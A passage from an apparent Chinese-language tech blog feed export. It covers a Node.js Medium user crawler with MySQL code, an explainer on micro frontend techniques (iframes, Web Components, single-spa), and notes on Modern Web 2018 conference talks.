_.get(json, &#x27;payload.references.Post&#x27;)    const name = _.get(json, &#x27;payload.user.name&#x27;)    const bio = _.get(json, &#x27;payload.user.bio&#x27;)      return &#123;      isMandarinUser: isMandarinUser(name, bio, posts),      userId,      name,      username: _.get(json, &#x27;payload.user.username&#x27;),      bio,      followerCount: follower,      mediumMemberAt: _.get(json, &#x27;payload.user.mediumMemberAt&#x27;),      isWriterProgramEnrolled: _.get(json, &#x27;payload.user.isWriterProgramEnrolled&#x27;),      createdAt: _.get(json, &#x27;payload.user.createdAt&#x27;),    &#125;  &#125;&#125;

isMandarinUser 會根據三個參數來決定：暱稱、自介以及相關文章。相關文章可能是使用者最近發表過的或者是回覆過與拍手過的文章，會根據文章的標題以及副標題來做判定。
如果使用者沒有任何活動的話，就會跟之前一樣採用自介跟暱稱來判定，所以還是有誤判的可能，但實測過後誤判率已經滿低的了。
接著來看與資料庫相關的操作，db.js：
const mysql = require(&#x27;mysql&#x27;)const moment = require(&#x27;moment&#x27;)  function format(time) &#123;  if (!time) return null  return moment(time).format(&#x27;YYYY-MM-DD HH:mm:ss&#x27;)&#125;  function transform(info) &#123;  return [    info.userId, info.username, info.name, info.bio, info.followerCount,    format(info.mediumMemberAt), format(info.createdAt), info.isWriterProgramEnrolled, null  ]&#125;  class DB &#123;  constructor(config) &#123;    this.conn = mysql.createPool(config)  &#125;    getExistingUserIds() &#123;    return new Promise((resolve, reject) =&gt; &#123;      this.conn.query(&#x27;SELECT userId from Users&#x27;, (err, results) =&gt; &#123;        if (err) &#123;          return reject(err)        &#125;       return resolve(results.map(item =&gt; item.userId))      &#125;);    &#125;)  &#125;     getUserIds(limit) &#123;    return new Promise((resolve, reject) =&gt; &#123;      this.conn.query(&#x27;SELECT userId from Users where fr=&quot;TW&quot; order by follower desc limit &#x27; + limit, (err, results) =&gt; &#123;        if (err) &#123;          return reject(err)        &#125;       return resolve(results.map(item =&gt; item.userId))      &#125;);    &#125;)  &#125;     deleteUserIds(userIds) &#123;    return new Promise((resolve, reject) =&gt; &#123;      this.conn.query(&#x27;DELETE from Queues WHERE userId IN (?)&#x27;, [userIds], (err, results) =&gt; &#123;        if (err) &#123;          return reject(err)        &#125;        return resolve(userIds)      &#125;)    &#125;)  &#125;    insertUserData(info) &#123;    if (!info) return    const data = Array.isArray(info) ? info.map(transform) : [transform(info)]    this.conn.query(`      INSERT INTO Users      (        userId, username, name, bio, follower,        mediumMemberAt, createdAt, isWriterProgramEnrolled, fr      ) VALUES ?`, [data], (err) =&gt; &#123;        if (err) &#123;          // console.log(err)        &#125;      &#125;    )  &#125;    insertIntoQueue(list) &#123;    return new Promise((resolve, reject) =&gt; &#123;      const values = []      for (let item of list) &#123;        values.push([item])      &#125;      this.conn.query(`        INSERT IGNORE INTO Queues (userId) VALUES ?`, [values], (err) =&gt; &#123;          if (err) &#123;            // console.log(err)          &#125;          resolve()        &#125;      )    &#125;)  &#125;&#125;  module.exports = DB

基本上就是把一大堆 SQL query 包裝成 Promise 以及 function，方便其他的 module 來使用。大部分的函式都能夠接收一個 array 來做批次操作，這樣會更有效率一點。
而且把這些東西包裝起來之後，queue 的程式碼就會變得非常單純：
class Queue &#123;  constructor(db) &#123;    this.db = db  &#125;    async get(limit) &#123;    const items = await this.db.getUserIds(limit)    await this.db.deleteUserIds(items)    return items  &#125;    async push(list) &#123;    await this.db.insertIntoQueue(list)  &#125;&#125;  module.exports = Queue

最後來看一下我們的主程式 app.js，在重構之後程式碼變得乾淨很多，可讀性也提昇了不少：
const DB = require(&#x27;./db&#x27;)const Queue = require(&#x27;./queue&#x27;)const config = require(&#x27;./config&#x27;)const medium = require(&#x27;./medium&#x27;)const utils = require(&#x27;./utils&#x27;)  async function main() &#123;  const db = new DB(config.db)  const queue = new Queue(db)  const existingUserIds = await db.getExistingUserIds()  const userIdMap = &#123;&#125;  for (let userId of existingUserIds) &#123;    userIdMap[userId] = true  &#125;    utils.log(&#x27;Existing userId:&#x27;, existingUserIds.length)    while(true) &#123;    const userIds = await queue.get(1)    if (userIds.length === 0) &#123;      utils.log(&#x27;Done&#x27;)      break    &#125;      const userId = userIds[0]    if (userIdMap[userId]) &#123;      continue    &#125;    userIdMap[userId] = true    utils.log(&#x27;userId:&#x27;, userId)      try &#123;      const userInfo = await medium.getUserInfo(userId)        if (!userInfo.userId) &#123;        utils.log(&#x27;getUerrInfo error, sleep for&#x27;, config.delayWhenError)        await utils.sleep(config.delayWhenError)      &#125;        if (!userInfo.isMandarinUser) &#123;        utils.log(userId, &#x27;not MandarinUser&#x27;)        continue      &#125;        db.insertUserData(userInfo)        if (userInfo.followerCount &gt; 0) &#123;        let to = undefined        let count = 0        while (true) &#123;          const data = await medium.getFollowers(userInfo.userId, to)          if (!data) &#123;            break          &#125;          const &#123; nextTo, followers &#125; = data          to = nextTo          count += followers.length          utils.log(userInfo.userId, &#x27;fetching&#x27;, count, &#x27;followers&#x27;)          await queue.push(followers.filter(uid =&gt; !userIdMap[uid]))          if (followers.length === 0 || !to) &#123;            break          &#125;        &#125;      &#125;    &#125; catch (err) &#123;      utils.log(&#x27;sleep for&#x27;, config.delayWhenError)      utils.log(err)      await utils.sleep(config.delayWhenError)    &#125;  &#125;  process.exit()&#125;  main()

這邊有個機制與之前不一樣，之前是每次從 queue 拿一個 userId 出來就去資料庫確認一下是否爬過，但是這樣太沒有效率。在這個版本改成程式執行時就直接從資料庫裡面把所有資料拿出來，並且變成一個 map，如果有值的話就代表已經抓取過，反之亦然。
重構過的程式碼把 module 切開之後看起來順眼很多，而且要改什麼都很容易，沒有重構過的話我還真不敢 open source 出去…
這邊是重構完的程式碼：https://github.com/aszx87410/medium-user-crawler
總結在寫爬蟲的過程中也是踩了滿多坑的，其中最麻煩的就是語言判斷那一塊，當初沒有想到日文漢字這個 case 要判斷，花了不少時間。偷懶也花了很多時間，原本偷懶不想用更精確的方法來做判定，沒想到最後還是得用，中間浪費了不少時間。
這爬蟲還有滿多地方可以改進的，例如說執行速度的部分，或者是判定語言的部分，目前是我把資料撈出來之後手動標是香港、台灣還是中國，但或許可以寫一些小程式來自動判定，例如說簡體就是中國，有出現一些粵語的字就是香港，反之則是台灣等等，雖然不一定準確，但至少用程式來輔助會方便很多。
這篇主要是分享一下我寫這個爬蟲的歷程，其實只要資料來源能確定抓得到，其他都不是什麼大問題。再加上這個爬蟲沒有很完整（例如說沒有 retry 機制），所以花個一兩天就能夠實作完成了。
希望這篇有吸引到大家，也很希望大家能試試看自己爬資料，做出有趣的數據分析！
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>medium</tag>
      </tags>
  </entry>
  <entry>
    <title>一起探討 Micro Frontends 的世界</title>
    <url>/2019/01/12/micro-frontends-concept/</url>
    <content><![CDATA[前言大概三個月前，忘了在哪看到 Micro Frontends 這個詞，當時沒有仔細去了解（畢竟聽起來就像是另一個 Buzzword XD），只是從名字大概猜測是想讓前端頁面更加模組化，讓不同團隊能更有效率的開發共同的站。稍微 Google 了一下這個 term，發現文章多數在 2018 的五六月出現，之後就鮮少人提起，我也就淡忘了他。
直到最近工作上接觸到的框架，似乎也想讓頁面上的元件更加低耦合，甚至是希望能支援運行不同版本或是 tech stack 的元件，才讓我又再想起 Micro Frontends 這個東西，所以查了點資料，這邊做個紀錄分享。
什麼是 Micro Frontends大部分查到的文章都有提到，Micro Frontends 最早出現在 2016 年 ThoughtWorks 這間公司公佈的技術雷達中，並在 2018 年五月進入試驗階段，代表他們認為這個架構是有發展淺力的。（查了一下 wiki，ThoughtWorks 是一間蠻大的全球軟體顧問公司，有自己的產品，也會為客戶制定各種前瞻軟體設計）
要解釋 Micro Frontends，可以先從 Microservices 講起。
Microservices 在後端的世界裡面已經運行多年，採用 Microservices 的團隊架構通常都是如下圖所繪：

後端中每個 Microservices 彼此之間獨立作業，各個團隊可以擁有自己的部署與開發技術，溝通可以透過各樣 API 介面來達成，與前端之間也只需要 HTTP request 即可進行各種服務串接。
在這樣的架構下，Frontend team 的程式碼卻還是都共存在一個 Monolithic 的結構內，當網站功能越趨複雜、團隊成長茁壯後，整個前端架構就會越來越難以維護，更別提前端技術的日新月異，很容易會產生 legacy code，這時若想要更新就麻煩了。
由於慢慢有人體會到這種問題，Micro Frontends 的想法才被提出：

從圖中不難發現，Frontend 的模組被拆分至各個 team 中，每個團隊獨立掌管自己的前後端服務，擁有自己的部署環境與 tech stack，團隊間低耦合，團隊中高內聚。此外，每個團隊產出的前端模組，要能夠有效的『拼貼』在同一個 SPA 頁面當中，保持使用者在產品的體驗上與原先的 SPA 一致。
在 micro-frontends.org 這個網站中說到，這樣的結構就算是 Micro Frontends，而這樣的概念其實更早之前就有，只是有別的名稱，分別叫做 Frontend Integration for Verticalised Systems 與 Self-contained Systems。
但我自己認為，Micro frontend 應該主要著重在：如何將前端頁面中以功能模組來拆分成不同獨立應用，並黏貼共存在同個 SPA 中。(後面會再提到目前常見的實作方式。)
而由 Micro Frontends 與 Micro Services 所組成的一個從 UI、商業邏輯、資料處理和系統部署，這樣完整的獨立服務，才算是一個 SCS - Self contain system。
Micro Frontends 的核心思想
Be Technology Agnostic：每個團隊可以使用自己的技術結構來開發前端模組，與其他團隊彼此之間互不干擾，也無須耗費成本相互協調。

Isolate Team Code：就算各個團隊採用同樣的技術框架，彼此之間也不該共享變數或狀態。彼此間應該透過 public API 來溝通。

Establish Team Prefixes：利用 Prefix 的方式來避免 CSS、Browser API、Web Event、Cookies 或 Local Storage 的衝突。

Favor Native Browser Features over Custom APIs：要整合 Micro Frontends 的複雜度其實很高，當每個模組間需要溝通時，盡量採用 Browser Native API 來完成較好；若真的需要額外的溝通方式（pub&#x2F;sub system），要盡量保持簡單。

Build a Resilient Site：透過 SSI 或 PWA 的方式增強網站的穩定性，在 JS 無法執行的狀況下也有堪用的呈現。


Micro Frontends 的實作方法source
接著我們先來看看要如何實現 Micro Frontends，達成如上圖所呈現的狀態，在同個頁面中，運行三個不同 Team 採用不同 Tech stack 的模組。
Team checkout 與 Team inspire 各自開發了前後端整合的模組，而 Team product 要負責整合它們。
三個 Team 採用不同 tech stack，並且獨立部署在各自的環境中運行，基本上可能會有三個 Host 分別 serve 它們：

https://microfrontends-checkout.com/

https://microfrontends-inspire.com/

https://microfrontends-product.com/


方法一：使用 iframe在 Team product 的模組中，可以利用嵌入 iframe 的方式來載入另外兩個模組，由於 iframe 天生就有隔離運行環境的特性，各團隊的模組相互不會干擾，若要通訊，在同網域下，我們更能直接透過 window.postMessage 來達成。
&lt;body&gt;  &lt;!-- in Team Product --&gt;  &lt;iframe width=&quot;100%&quot; height=&quot;200&quot; src=&quot;https://microfrontends-checkout.com/&quot;&gt;&lt;/iframe&gt;  &lt;iframe width=&quot;100%&quot; height=&quot;200&quot; src=&quot;https://microfrontends-inspire.com/&quot;&gt;&lt;/iframe&gt;&lt;/body&gt;

缺點:
但使用 iframe 的缺點很多，基本上不會有人想採用這種方法…像是：由於應用模組是分開的，無法將共用的依賴模組取出來，導致頁面可能會同時載入重複的 code；再者，UI 的呈現上也會變得很難控制，若是其中還含有表單之類的功能，就更麻煩了。
方法二：在 Client side 用 JS 載入模組function loadPage (element) &#123;  [].forEach.call(element.querySelectorAll(&#x27;script&#x27;), function () &#123;    const script = document.createElement(&quot;script&quot;);    script.setAttribute(&quot;src&quot;, `https://microfrontends-$&#123;element.dataset.url&#125;.com/`);    script.setAttribute(&quot;type&quot;, &quot;text/javascript&quot;);    element.appendChild(script);  &#125;);&#125;document.querySelectorAll(&#x27;.pagelet&#x27;).forEach(loadPage);

&lt;!-- in Team Product --&gt;&lt;div class=&quot;pagelet&quot; data-url=&quot;checkout&quot;&gt;&lt;/div&gt;&lt;div class=&quot;pagelet&quot; data-url=&quot;inspire&quot;&gt;&lt;/div&gt;

也就是在 client side ajax 抓取模組，塞入對應的 target div 內。這種做法需要注意 js、css 等的載入順序，Facebook 在多年前是用 BigPipe 來處理（可能 FB 已經沒在使用，但還是很值得了解的一個專案！）：
&lt;script type=&quot;text/javascript&quot;&gt;big_pipe.onPageletArrive(&#123;id: “pagelet_composer”, content=&lt;HTML&gt;, css=[..], js=[..], …&#125;)&lt;/script&gt;

類似這樣，用 array 來依序載入資源。
但缺點明顯就是無法 Server-side render。
方法三：Web component這邊是指 Web standard 下包含 Custom Element、HTML template、Shadow DOM 與 HTML imports 的 Web component。
各個團隊可以用自己想使用的 tech stack 來製作元件，但最終包裹成 Web component 的形式，以 React 為例：
import React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;const SearchComponent = (&#123; children &#125;) =&gt; &#123;  return (    &lt;div&gt;      &lt;p className=&quot;search-component&quot;&gt;&#123;children&#125;&lt;/p&gt;    &lt;/div&gt;  );&#125;;class CustomSearch extends HTMLElement &#123;  connectedCallback() &#123;    const mountPoint = document.createElement(&#x27;span&#x27;);    this.attachShadow(&#123; mode: &#x27;open&#x27; &#125;).appendChild(mountPoint);    const name = this.getAttribute(&#x27;name&#x27;);    const keyword = this.getAttribute(&#x27;keyword&#x27;);    const url = &#x27;https://www.google.com/search?q=&#x27; + encodeURIComponent(name);    ReactDOM.render(      &lt;&gt;        &lt;a href=&#123;url&#125;&gt;&#123;name&#125;&lt;/a&gt;        &lt;SearchComponent&gt;&#123;keyword&#125;&lt;/SearchComponent&gt;      &lt;/&gt;,      mountPoint,    );  &#125;&#125;customElements.define(&#x27;custom-search&#x27;, CustomSearch);

&lt;!-- in Team Product --&gt;&lt;!-- search component from Team Inspire --&gt;&lt;custom-search name=&quot;TeamInspire&quot; keyword=&quot;Micro Frontends&quot;&gt;&lt;/custom-search&gt;

採用 Web component 可以讓程式碼清晰可讀，元件之間各自獨立，所有資源都由自身控制該如何加載，團隊在使用這些元件上，就如同一般 HTML DOM，並且可以直接利用 Web Event API 來進行元間間的溝通。例如：
// in Team checkoutconst event = new CustomEvent(&#x27;buy&#x27;, &#123; item: &#x27;car&#x27; &#125;);window.dispatchEvent(event);

In React:
componentDidMount() &#123;  window.addEventListener(&#x27;buy&#x27;, (event) =&gt; &#123;    this.setState(&#123; buyItem: [...this.state.buyItem, event.item] &#125;);  &#125;, false);&#125;

此外，如果 Web component 還能搭配 SSI (Server Side Includes) 來達成 SSR：
&lt;custom-search keyword=&quot;Micro Frontends&quot;&gt;  &lt;!--#include virtual=&quot;/custom-search?keyword=&quot;Micro Frontends&quot; --&gt;&lt;/custom-search&gt;

server &#123;  listen 3000;  ssi on;  location /TeamInspire &#123;    proxy_pass  https://microfrontends-TeamInspire.com;  &#125;

每個 Micro Frontend team 自己要建立起 component server，用來 serve component 的 markup。並且實作的 Web component 本身也要修改成支援 Server side render。不過重點是，這樣在技術上是可行的，至少比上一種方式好。
但缺點也很明顯：

需要 polyfills 來補足瀏覽器支援度問題。
雖說大家能用不同 Tech stack，但本質上每個團隊最終還是得想辦法用成統一的 Web component
Web component 的發展與普及不夠快速。

關於 Web component 實作 Micro Frontends 的範例與細節，大家可以到 micro-frontends.org 看，範例 code 甚至都包成 docker，很快就能裝起來玩！
方法四：Single-SPA - javascript metaframeworkCanopyTax 這間公司推出的一個開源專案，提供了一些方便的 API 讓你達到：

用各種技術構建 micro frontends。

在同個頁面下使用多種前端 framework 組成的模組，且無需 refresh page。

在現有的應用中嘗試新的 framework，而不必全部重寫。

支援 Lazy load

支援 Hot reload


有興趣的讀者可以前往他們的 repo 看各種範例與程式碼。類似這樣的使用方式：
import * as singleSpa from &#x27;single-spa&#x27;;const loadingFunction = () =&gt; import(&#x27;./react/react.app.js&#x27;);// 可根據 route 來切分要換成哪個模組並動態載入相應資源const activityFunction = location =&gt; location.hash.startsWith(&#x27;#/react-app&#x27;);singleSpa.declareChildApplication(appName, loadingFunction, activityFunction);singleSpa.start();

其他方法：在查資料的過程中，其實大家在討論的 Micro Frontends 都會著重在各 Team 間採用不同 tech stack 的前提，可能是這樣才比較好凸顯 Micro Frontends 切割模組的感覺。
但是如果只是想要讓 Microservices 都有各自對應的前端模組，我們其實也可以直接用 React 來建造各類元件庫，讓主 App 下載使用。
這樣會是一個折衷的方案，不用煩惱 common dependences 的問題，但相對的在升級版本時，可能就得一次將所有元件庫內的元件都升級才可以使用。
有點偏離 Micro Frontends 的核心就是了。
Micro Frontends 帶來的好處與壞處Micro Frontends 的好處就在於，各個模組間是非常獨立的，彼此間的部署不需要互相等待，tech stack 也不一定要用相同的，也就是說，在汰換 legacy code 的過程可以順暢一些，也更容易嘗試新技術，可以漸進式的把 SPA 上的模組替換成更好或更新的框架，讓新舊 code 能夠並存無衝突。團隊在開發上可以更敏捷。
但實務上我想應該不太會有人想在同個頁面上同時存在多種框架吧？試想，一個頁面上如果同時存在 React 與 Vue，甚至是 Angular，這樣 Page load time 大概難以想像。再加上缺乏統一打包的步驟，共用資源的相依性就無法被知曉，要如何有效處理 Common resources 是很麻煩的難題。
還有就是 CSS 解決方案，會不會需要處理命名衝突，也是一個隱憂。若是公司資源不夠，沒有辦法利用像 Zeplin 之類的工具了統一定義 Style guideline，就還得想辦法協調各 Team 開發模組的 style 問題。
整體而言看起來 Micro Frontends 的複雜度並不小，應該比較適合大型應用，或真的有許多 Legacy code 要處理的公司團隊。
那有誰採用 Micro Frontends？很多公司可能都有自己的類似解決方案，就像 FB 的 bigpie，或是 Yahoo 也有類似的作法。
在我查到的資料當中，比較有提到 Micro Frontends 的大公司有 Spotify 與 IKEA，細節就給大家自行去欣賞他們的分享了：
Spotify - How Spotify Builds Products (Organization. Architecture, Autonomy, Accountability):

Spotify 是從 UI 來區分團隊負責的 function，原先採用 iframe 與 postMessage 的方式來處理 Micro Frontends，團隊間 technology independence，但他們已經捨棄這個架構很久了，後來改採一律 react&#x2F;redux 的架構。可以看這份 twitter 討論。
另外，它們是有一個團隊在負責檢驗各 team 產出的模組 UI style 是否維持產品的一致性。
MICROSERVICE WEBSITES - Gustaf N. Kotte

小結論其實會需要用到 Micro Frontends 結構的應該不多，尤其在 React&#x2F;Vue&#x2F;Angular 主宰的這幾年，需求相對更少。越大型的 web app 與團隊才比較值得去嘗試。
現行的實作方式其實都很複雜，上面描述的方法與網路看到的 prototype 都過於簡化了。
但這種高階層架構的思考與設計其實多多益善，從中發現的困難更能推動技術發展，而且也很有趣！
資料來源
micro-frontends.org
フロントエンドエンジニアは Micro Frontends の夢を見るか
技术雷达之「微前端」- 将微服务理念扩展到前端开发（上：理论篇）
技术雷达之「微前端」- 将微服务理念扩展到前端开发（下：实战篇）
Micro Frontends Proof of Concept
Independent micro frontends with Single SPA library
Single-SPA
Spotify - How Spotify Builds Products (Organization. Architecture, Autonomy, Accountability)
MICROSERVICE WEBSITES - Gustaf N. Kotte

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>frontends</tag>
        <tag>micro</tag>
      </tags>
  </entry>
  <entry>
    <title>Modern Web 2018 簡短心得</title>
    <url>/2018/07/20/modern-web-2018/</url>
    <content><![CDATA[前言很久沒參加 conference 了，而這次剛好有機會參加 Modern Web 2018 並且擔任講者之一，趁機把與會的心得記錄下來並且簡單筆記一下我有在聽的議程的心得。
由於這篇只是個人簡短的筆記以及心得，如果想看完整議程的可以到這裡，或如果想看更完整的紀錄，今年也有大家在 HackMD 上寫的共筆：https://hackmd.io/c/MW18
How We Ended Up With Electron - Felix Rieseberg講者來自於 Slack，當初沒仔細看介紹原本以為他要講 Electron 在 Slack 內應用碰到的坑之類的，但後來講的內容就是很基本的 Electron 介紹以及帶來簡單的 live demo，利用 Monaco Editor 做出一個很簡單的 Editor 並且示範如何打包成可執行檔。
如果是之前沒碰過 Electron 的人應該會滿喜歡這場的，是不錯的入門介紹。
我為什麼選擇 Vue.js - 趙錦江 (勾三股四)來自阿里雲的講者，同時也是 Vue.js 的團隊成員之一。
這場是我第一天最喜歡的一場議程，作者從以前工作時就碰到的一個問題開始講，找了幾種現有的解決方法都不太滿意，後來用一些其他技術寫了一個簡單的 library，後來某天看到 Vue.js 的核心概念跟他很像，有種不謀而合的感覺，從此以後就決定要使用 Vue 了（那時候才 2013 年，Vue 的版本是 v0.10）
後來跟同事推廣這套，但他們不買單，覺得這東西太新而且又不是什麼大公司做的，不願意去用它。但儘管如此，作者還是用額外的時間在嘗試 Vue.js，但一開始也碰到一些程式碼的組織問題（template 放一起、CSS 放一起），後來發現 vue-loader 又再次不謀而合的解決了這個問題。
後來到了 2015，Vue 的聲勢開始慢慢壯大，而 React Native 的出現也讓講者思考起 Vue Native 的可能性，後來在公司內嘗試了一個解決方案並且被公司採用，終於在光棍節正式運用在天貓首頁，沒錯，就是 Weex。
而一路走來的過程中講者也發現有時候問題並不在工具本身，而在生態圈。你要有好的社群、好的文件才能把整個生態系建立起來，所以後來就比較專注在這個方向。
從講者的這段歷程可以看見 Vue.js 的發展，從一個小小的 library 變到現在成為三大前端框架之一，若是一路跟著走來的人一定很感動。最後也講了一些 Vue 之後可能的發展以及 3.0 正在討論之中，有在關注 Vue 的朋友可以留意一下。
WebAssembly 在全民直播的應用 - 趙洋 (Eros Zhao)之前有做過一點直播（還寫了一點筆記：直播協議 hls 筆記）所以對這場特別有興趣，聽了之後果真沒失望。
一開始會用到 WebAssembly 是因為上面問說能不能支援在 WeChat 的 Webview 播放？但經過調查之後發現 WeChat 只支援 hls 格式，最短也會有 10 秒鐘的延遲，對直播來說是沒辦法接受的，而 MSE 也無法使用，可以切入的兩個點是 WebGL 跟 WebAudio API 都有支持，所以就圍繞著這個切入點來想解決辦法，看看有沒有可能在 JavaScript 這層自己解碼然後用上述提到的兩個東西一個播放畫面一個播放聲音。
後來找到一套 library 叫做：jsmpeg，發現應該是可以達成的，但仍然有很多東西有自己來，例如說 H264 的編解碼器在 JavaScript 上面沒有成熟的解決方案以及可能會有效能問題，這時候就是 WebAssembly 登場的時候了，後來就直接拿 C&#x2F;C++ 的來改一改 compile 成 WebAssembly。
雖然我沒什麼在關注 WebAssembly，不過我覺得以後用到的場合應該會越來越多（不過應該也不會多到哪裡去），大概就像寫 Android 跟 JNI 的關係差不多吧，你碰到一些地方很需要效能或是要更有安全性一點的話，就用 JNI 來寫 C 的 code，我自己對 WebAssembly 的感覺也是這樣。
A Modern Web Architecture for (GDPR) Compliance - 曾義峰 (Ant)介紹了一下 GDPR 裡面到底有哪些條款以及企業應該如何遵守，其實對 GDPR 也有很多不同面向的討論，例如說有些專家覺得 GDPR 的法規太複雜，根本沒有企業能夠 100% 遵守，還有人推出了幫忙 block 來自歐盟的 IP 的服務，滿有趣的（但沒什麼用就是了，GDPR 不僅限於歐盟 IP）。
之後有講到在 DevOps 裡面加上 Security 的元素，變成 SecDevOps，不過後面這整段我沒有聽得很懂就是了，對 DevOps 這塊不太熟悉。總之在這場演講裡面學到滿多跟 GDPR 有關的東西，滿有趣的。
遺留代碼經濟學 - Terry Yin我覺得這場的講者口條超好然後也講得很有趣，主要是在講 Legacy code 以及在重構時應該注意的事項。裡面有提到一句經典名言：「高內聚，低耦合」，講者說記得臨死前要把這句話傳給孫子。
但有些人一學到這些東西之後就走火入魔了，不管是什麼都有開始解耦，覺得這樣很帥，但在高內聚跟低耦合之中，比較重要的其實是前者。因為沒有高內聚的話你東西分散四處很難 debug，可是沒有解耦的話頂多就東西混在一起，你要拆開的時候還是隨時都可以拆開，相較之下會比較容易一點。
相信大家都有跟 Legacy code 奮戰的一些經驗，這次的 Modern web 除了這場以外也有別的是在討論類似的議題。
傳統如何翻新，用Serverless新架構改造傳統資料分析ETL：以利用 AWS Lambda Batch 為例 - 楊立偉 (Bryan Yang)這場大爆滿，兩側走道都站滿了人，我對這領域很陌生，是誤打誤撞之下才聽到這一場，不過也覺得這場很棒。
要解決的問題其實就是要提供給內部使用者一個介面，讓他們可以輸入 query，接著把符合的資料從 AWS 轉到 GCP 上面。聽著來很容易，但仔細一個一個步驟分析下來就會發現其實很多細節要注意。
例如說你要有一個前端做介面、一個後端寫 Server，還要有一個人負責監控 Server 的狀況，然後把資料轉過去也因為格式不互通的關係需要額外再做轉檔，而且每一個步驟都要監控是否成功，要把結果再回傳給 user。
後來講者在 AWS 上面尋找可以運用的服務，最後成功用一大堆 AWS 的服務把這整個流程串起來，是一個 Serverless 的解決方案。例如說前端的部分直接讓使用者用 postman 打 API，再用 API gateway 接資料後用 lambda 處理，用 Batch 去開機器轉檔，轉完之後再去 trigger Google 的 Cloud function 把資料搬進去，途中都用 CloudWatch 來監控並且用 slack 回傳結果。
看起來滿方便的但其實也有缺點，那就是有很多元件，你要了解每一個 service 的 input、output 以及使用方法，其實要花很多時間，再來語言是 python 跟 node.js 混用，因為有些不支援 python。發生問題的時候也很難 debug 因為太多環節了。
From Traditional Web to Modern Web - 蕭晊莛 (Neo)這場也是在講如何跟 Legacy code 奮戰。起因是每次大家去一些 conf 之後都會看到很多新潮的東西，可是回到公司只能面對十年前的技術棧，在 conf 上面學到的完全都用不上，所以講者就要想辦法來解決這個問題。
其實要引用新的東西不用完全引用，一次就全部換掉，而是可以慢慢來。講者簡單示範了用 Vue 來實作 PM 交代的新功能，順便把相關的程式碼換了一下，這樣慢慢把程式碼換掉一方面可以保證穩定性，另一方面也可以引入新的技術。
不過我自己覺得可能換到一半的時候最麻煩，一半新的一半舊的，可以預期到應該會有一些問題。而在置換的過程中其實就有碰到問題，例如說 jQuery 跟 Vue 在某些功能上不太相容，例如說 jQuery 可能會把你的 DOM 刪掉之類的，這方面也要特別注意。
用 CSS 玩出無限可能！ - 卓承賢 (AarOn)這場超有趣的。簡單來說就是用 CSS 來畫畫，用一些很基本的屬性搭配組合就可以畫出很厲害的東西。例如說講者畫了喬巴還畫了一碗拉麵。
雖然說背後原理應該通了就不難，但我覺得對工程師來說最難的應該是「到底要畫什麼」，同樣是一碗拉麵，我相信純工程師跟有設計背景的工程師畫出來的東西質感也是差很多，例如說可能就不會考慮到陰影之類的。
總之是一場很有趣的議程，有興趣的也可以參考看看講者在 codepen 上面的作品。
從平台、媒體到數據公司：PIXNET 的技術架構演進 - 林瑞男 (Jnlin)這場就是在講 PIXNET 的歷史，相對於其他場其實會比較無聊一點，技術的含量也會比較低。比起技術上面的架構，談到組織上面的架構比較多。
在一開頭時講者就提供了一個網站開放大家提問，最高票的兩個問題是：

為什麼廣告這麼多
對黑帽 SEO 發布假文章有沒有什麼應對措施？

每次只要有 PIXNET 的場合就會被問到這些問題，他們應該也有點習慣了。畢竟想到 PIXNEXT，大家想到的第一件事應該就是蓋板廣告。
Modern Talk 閃電秀閃電秀一直都是一個又歡樂又有趣的單元，今年也不例外。不過講的人有點多，我就挑一個我印象最深刻的。
來自趨勢科技的山姆大叔給的講題：GraphQL in 5 mins，主要是因為很多人雖然都對 GraphQL 有興趣，但最麻煩的一點還是原來那一大堆的 RESTful API 要怎麼辦？其實可以先用一些技巧讓前端用 GraphQL，可是後端還是 RESTful API，雖然感覺很髒但也沒辦法，不失為一個解決方法。
口條很好也很幽默，有致敬第一天的講者還有引經據典，沒聽到這場的真的可惜，
SOLO - 李維翰(Paul Li)Modern Web 的壓軸。
大概兩三年前在 JSDC 還是哪邊就有聽過 Paul 的演講，真的是很有渲染力以及個人風格強烈的演說。這次講的題目是他最近一直在研究的 AMP，其實我到那之前都一直以為 AMP 就是一個你用了之後就可以在 Google 搜尋結果上面排名變高然後會有比較原生的體驗。
但聽了一些東西之後發現這只是 AMP 的其中一個面向，其實他可以做到的更多更廣，應該要找個時間來好好研究一下 AMP。
這場介紹了滿多 AMP 相關的應用以及如何用現有的 AMP 元件組合出其他功能，但其實我印象最深刻的反而跟 AMP 無關，有一個我覺得很酷的就是 input 的 suggestion 那個功能，平常大家應該是用 JavaScript 來控制要不要顯示 suggestion 的選單，這次學到了居然可以用 CSS 來控制！
input:placeholder-shown ~ .suggestion &#123;  display: none;&#125;

如果 placeholder 有顯示的話就代表 input 是空的，就把 suggestion 用 CSS 隱藏掉，高招！
輕鬆應付複雜的非同步操作：RxJS Redux Observable - 胡立 (huli)這我自己的議程所以放最後講。
在前一天我有先把簡報放上去 Facebook 的社團，因為我以前在聽 conf 的時候都很希望講者能夠在一開始就把簡報檔的連結公布，不然有些比較小的圖片其實底下的人根本看不清楚，因為距離實在是太遠。
有些人沒辦法這樣做是因為簡報裡面有一些梗，提早破梗就不有趣了，不過我的簡報沒什麼梗所以沒差，就在演講前一天公布了，也可以順便讓大家自己看看對這場議程有沒有興趣。
事前大概有演練個兩三次，看一下自己要講什麼以及抓一下時間，但真的站上台就是腦子一片空白，其實講什麼都是靠直覺的，沒什麼餘力思考，畢竟你一但停止講話了，就整個會場都沒聲音了，不過適時的留白應該還是 OK。
時間掌握的話我覺得算是還行，就後半部分可能有一點點趕，但結束的時候是剛好 40 分鐘左右，我有把我想講的大概都傳達出來。會後也有一些聽眾來找我交流，之後有機會的話可以把這個簡報變成幾篇系列文好好講一下這個主題，或是我有在想乾脆直接用「如何用 Redux 處理 API」去開一堂付費的線上課程，畢竟影片講的還是會比較清楚一點。
不過一切都還在規劃階段啦，如果有興趣的話也歡迎留言讓我知道。
與會心得與總結這是我第一次參加 Modern Web，其實我很少參加 conf，上一次參加的可能是 2015 的 JSDC 跟不知道什麼時候的 COSCUP，所以第一點讓我覺得不一樣的是場地，我原本預期的場地是像中研院那樣每個人都有桌子都有插座那種，但這次只有前排有，後排都是額外再放上去的椅子然後沒有桌子。
以場地來說，其實比較像一些大公司辦的活動例如說 AWS Summit 之類的，不過我也沒有覺得這個場地有問題，因為中研院的場地可能已經是頂級的了，所以其他場地沒有那麼好我可以理解。
